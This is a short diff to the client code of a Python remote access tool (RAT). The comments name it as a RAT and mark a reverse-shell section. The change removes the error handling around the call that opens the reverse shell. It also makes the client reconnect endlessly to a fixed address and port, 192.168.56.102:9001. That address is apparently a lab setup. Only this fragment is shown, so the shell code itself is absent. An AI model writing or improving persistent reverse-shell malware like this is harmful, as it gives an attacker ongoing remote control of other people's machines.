@@ -53,19 +53,15 @@ class Client:
         # --------------------------REV SHELL--------------------------#
 
         # Get a reverse shell back to server
-        try:
-            self.shell.get_shell()
-        except socket.error:
-            time.sleep(5)  # Wait 5s
-            self.sock.close()  # Close erroneous connection
-            self.hack()  # Retry
+        self.shell.get_shell()
 
-        # # --------------------------------------------------------------#
+        # --------------------------------------------------------------#
 
-        # Close connection when finished
+        #Close connection when done
         self.sock.close()
 
 
 if __name__ == "__main__":
-    # Run RAT with specified IP and port
-    Client("192.168.56.102", 9001).run()
+    # Run RAT with specified IP and port continiously
+    while 1:
+        Client("192.168.56.102", 9001).run()
